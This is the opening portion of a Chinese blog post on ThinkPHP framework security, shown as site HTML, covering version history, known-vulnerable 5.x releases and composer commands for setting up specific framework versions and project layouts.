<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2025/07/28/thinkphp 框架安全/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            ThinkPHP 框架安全 | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    书签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                书签
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">56</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">ThinkPHP 框架安全</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-07-28 23:10:49</span>
        <span class="mobile">2025-07-28 23:10:49</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-08-19 01:11:42</span>
            <span class="mobile">2025-08-19 01:11:42</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/web/">web</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/web/php-web/">php web</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/php-web/">php web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>22.9k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>109 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<p><strong>ThinkPHP</strong> 是中国开发者广泛使用的一款 <strong>开源 PHP 框架</strong>，由 <strong>TopThink 团队</strong> 开发，目标是让开发更快、更简单。它遵循 <strong>MVC（Model-View-Controller）设计模式</strong>，具有良好的代码组织、数据库操作封装、模板引擎等特性。</p>
<p>ThinkPHP 版本架构：</p>
<table>
<thead>
<tr>
<th>版本</th>
<th>状态</th>
<th>最低 PHP</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>8.x</strong></td>
<td>最新稳定，官方推荐</td>
<td>≥ PHP 8.1</td>
<td>全面 PSR 标准、强类型、属性注解，统一配置系统，内置 FPM&#x2F;Swow 双运行时支持。性能增强，适配现代 PHP 项目。</td>
</tr>
<tr>
<td><strong>6.1.x</strong></td>
<td>长期维护 (LTS)</td>
<td>≥ PHP 7.4</td>
<td>社区使用最广，插件教程丰富，架构清晰稳定，适合中大型项目和企业框架基础。</td>
</tr>
<tr>
<td>5.1&#x2F;5.0</td>
<td>仅安全维护</td>
<td>≥ PHP 5.6</td>
<td>老项目兼容性好，<strong>存在多起已知漏洞</strong>（如 RCE&#x2F;LFI 等），<strong>不推荐用于新项目开发</strong>。</td>
</tr>
</tbody></table>
<p>ThinkPHP 的源码托管在 GitHub 上：</p>
<ul>
<li><p><strong>ThinkPHP 5.x 和以下</strong>版本的源码主仓库位于 <a class="link"   target="_blank" rel="noopener" href="https://github.com/top-think/framework%E3%80%82%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%BB%A5" >https://github.com/top-think/framework。不同版本以<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <code>tag</code> 的形式管理。</p>
</li>
<li><p><strong>ThinkPHP 6</strong> 起进行了架构重组，并迁移到新的组织下，主仓库是：<a class="link"   target="_blank" rel="noopener" href="https://github.com/top-think/think%E3%80%82" >https://github.com/top-think/think。<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
</ul>
<p>在分析时我们先把项目源码下载下来，然后通过 <code>git</code> 切换到对应的版本上。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 克隆仓库</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/top-think/framework.git thinkphp</span><br><span class="line"><span class="built_in">cd</span> thinkphp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看有哪些版本标签</span></span><br><span class="line">git tag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到某个版本（例如 ThinkPHP 5.0.24）</span></span><br><span class="line">git checkout 5.0.24</span><br></pre></td></tr></table></figure></div>

<h1 id="环境基础"><a href="#环境基础" class="headerlink" title="环境基础"></a>环境基础</h1><h2 id="项目创建"><a href="#项目创建" class="headerlink" title="项目创建"></a>项目创建</h2><p><strong>ThinkPHP 自 5.1 起就全面 Composer 化</strong>，框架本体被拆分为多个组件，如 <code>topthink/framework</code>、<code>topthink/think-orm</code> 等；版本号发布统一在 <a class="link"   target="_blank" rel="noopener" href="https://packagist.org/packages/topthink/framework" >Packagist<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 上维护。</p>
<blockquote>
<p>Packagist 是 Composer 的官方包仓库，所有 PHP 包（类库、框架、插件等）默认都从这里下载安装。</p>
</blockquote>
<p>由于 ThinkPHP 的每个版本都可能使用不同的依赖、容器、事件系统，<strong>手动放源码无法还原环境差异</strong>。因此 <strong>ThinkPHP 官方推荐使用 Composer 来创建和管理 ThinkPHP 项目</strong>。</p>
<p>我们可以通过下面这条命令创建一个指定版本的 ThinkPHP 项目。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=版本号 目录名</span><br></pre></td></tr></table></figure></div>

<p>例如：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=5.0.23 tp5-test</span><br><span class="line">composer create-project topthink/think=5.1.41 tp51-test</span><br><span class="line">composer create-project topthink/think=6.0.* tp6-test</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>Composer 默认会自动识别你的 PHP 版本，来判断是否支持该版本的 ThinkPHP。如果版本不满足，它会报错或降级。其中 ThinkPHP 的版本号可以通过 Composer 命令行查询：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer show topthink/framework --all</span><br></pre></td></tr></table></figure></div>

<p>目前支持的版本有：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">versions : dev-master, 8.x-dev, v8.1.3, v8.1.2, v8.1.1, v8.1.0, v8.0.4, v8.0.3, v8.0.2, v8.0.1, v8.0.0, v8.0.0-beta, 6.1.x-dev, v6.1.5, v6.1.4, v6.1.3, v6.1.2, v6.1.1, v6.1.0, 6.0.x-dev, v6.0.16, v6.0.15, v6.0.14, v6.0.13, v6.0.12, v6.0.11, v6.0.10, v6.0.9, v6.0.8, v6.0.7, v6.0.6, v6.0.5, v6.0.4, v6.0.3, v6.0.2, v6.0.1, v6.0.0, v6.0.0-rc5, v6.0.0-rc4, v6.0.0-rc3, v6.0.0-rc2, v5.2-rc1, v5.2-beta.3, v5.2-beta.2, 5.1.x-dev, v5.1.42, v5.1.41, v5.1.40, v5.1.39, v5.1.38.1, v5.1.38, v5.1.37.1, v5.1.37, v5.1.36, v5.1.35, v5.1.34, v5.1.33, v5.1.32, v5.1.31, v5.1.30, v5.1.29, v5.1.28, v5.1.27, v5.1.26, v5.1.25, v5.1.24, v5.1.23, v5.1.22, v5.1.21, v5.1.20, v5.1.19, v5.1.18, v5.1.17, v5.1.16, v5.1.15, v5.1.14, v5.1.13, v5.1.12, v5.1.11, v5.1.10, v5.1.9, v5.1.8, v5.1.7, v5.1.6, v5.1.5, v5.1.4, v5.1.3, v5.1.2, v5.1.1, v5.1.0, v5.1-rc.3, v5.1-rc.2, v5.1-rc.1, v5.1-beta.1, v5.0.25, v5.0.24, v5.0.23, v5.0.22, v5.0.21, v5.0.20, v5.0.19, v5.0.18, v5.0.17, v5.0.16, v5.0.15, v5.0.14, v5.0.13, v5.0.12, v5.0.11, v5.0.10, v5.0.9, v5.0.8, v5.0.7, v5.0.6, v5.0.5, v5.0.4, v5.0.3, v5.0.2, v5.0.1, 5.0, 5.0-rc4, 5.0-rc3, 5.0-rc2, 5.0-rc1</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>另外例如 <code>topthink/think=5.0.23</code> 表示的是这个「<strong>项目模板包</strong>」的版本号是 5.0.23，而 ThinkPHP 的版本号指的是 <code>topthink/framework</code>（也就是 ThinkPHP 框架核心代码）的版本号，这个并没有直接指定。我们可以通过下面这条命令查看 <code>topthink/framework</code> 的实际版本。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer show topthink/framework</span><br></pre></td></tr></table></figure></div>

<p>也就是说下面这条命令表示“我要用一个符合 ThinkPHP 5.0.23 项目结构的模板创建项目”。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=5.0.23 tp5-test</span><br></pre></td></tr></table></figure></div>

<p>而它依赖的 <code>topthink/framework</code> 版本是由这个模板的 <code>composer.json</code> 决定。</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.0.*&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>这个实际上也可以通过下面这条命令查询：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer show topthink/think 5.0.24 --all</span><br></pre></td></tr></table></figure></div>

<p>所以实际安装的是最新的 <strong>5.0.x</strong>，也就是 <code>topthink/framework@5.0.25</code>。</p>
<p>如果我们想将 <code>topthink/framework</code> 降级到指定版本需要运行下面这条命令：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require topthink/framework=5.0.23</span><br></pre></td></tr></table></figure></div>

<p>这条命令会将框架降级到 <strong>5.0.23</strong>，适用于在 <code>5.0.*</code> 这个小版本范围内自由切换版本（如 5.0.22、5.0.25 等），便于测试历史行为或漏洞验证。</p>
<h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><h3 id="ThinkPHP5"><a href="#ThinkPHP5" class="headerlink" title="ThinkPHP5"></a>ThinkPHP5</h3><p>一个基于 ThinkPHP5 的典型 Web 项目如下:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">tp5-test/                 ← ★ 整个项目根目录</span><br><span class="line">├── application/          ← ★ 业务代码根目录（MVC 与配置）</span><br><span class="line">│   ├── index/                ← 默认模块（module）</span><br><span class="line">│   │   └── controller/</span><br><span class="line">│   │       └── Index.php     ← 示例控制器（默认首页）</span><br><span class="line">│   ├── common.php            ← 公共函数（系统自动加载）</span><br><span class="line">│   ├── command.php           ← CLI 自定义命令注册</span><br><span class="line">│   ├── config.php            ← 应用级配置（可覆盖框架默认配置）</span><br><span class="line">│   ├── database.php          ← 数据库连接配置</span><br><span class="line">│   ├── route.php             ← 路由规则（闭包或静态路由）</span><br><span class="line">│   └── tags.php              ← 事件 / 标签扩展</span><br><span class="line">│</span><br><span class="line">├── public/               ← ★ Web 服务器根目录（部署时仅暴露此层）</span><br><span class="line">│   ├── index.php             ← 项目入口文件（所有 HTTP 请求从这里进入）</span><br><span class="line">│   ├── router.php            ← PHP 内置服务器路由脚本（开发用）</span><br><span class="line">│   ├── favicon.ico</span><br><span class="line">│   ├── robots.txt</span><br><span class="line">│   └── static/               ← 前端静态资源（JS / CSS / 图片）</span><br><span class="line">│</span><br><span class="line">├── thinkphp/             ← ★ 框架核心源码（不要修改）</span><br><span class="line">│   ├── start.php             ← 框架启动器，入口文件最终 require 这里</span><br><span class="line">│   ├── base.php / helper.php ← 常量 &amp; 全局助手函数（如 dump()）</span><br><span class="line">│   └── library/think/…       ← App、Route、Model 等所有核心类</span><br><span class="line">│</span><br><span class="line">├── vendor/               ← ★ Composer 依赖目录</span><br><span class="line">│   ├── autoload.php          ← Composer 自动加载入口</span><br><span class="line">│   ├── composer/             ← Composer 运行期文件</span><br><span class="line">│   └── topthink/think-installer/  ← ThinkPHP 专用安装插件（生成默认结构）</span><br><span class="line">│       └── …                  ← 插件源码，不需手动修改</span><br><span class="line">│</span><br><span class="line">├── extend/               ← 第三方或自定义扩展库（可选，自定义加载）</span><br><span class="line">│</span><br><span class="line">├── runtime/              ← 运行时生成：日志、缓存、模板编译等</span><br><span class="line">│</span><br><span class="line">├── composer.json         ← ★ 依赖声明与自动加载规则</span><br><span class="line">├── composer.lock         ← 锁定实际安装版本（保证环境一致）</span><br><span class="line">├── think                 ← 命令行入口脚本（如 `php think run`）</span><br><span class="line">├── build.php             ← 可选：快速生成模块目录的脚本</span><br><span class="line">├── CHANGELOG.md          ← 框架更新日志</span><br><span class="line">├── LICENSE.txt           ← 开源许可证</span><br><span class="line">└── README.md             ← 项目/框架使用说明</span><br></pre></td></tr></table></figure></div>

<h3 id="ThinkPHP6"><a href="#ThinkPHP6" class="headerlink" title="ThinkPHP6"></a>ThinkPHP6</h3><p>ThinkPHP 6 相比 ThinkPHP 5 项目结构做了不少 <strong>精简与现代化</strong> 的调整。一个基于 ThinkPHP6 的典型 Web 项目如下:</p>
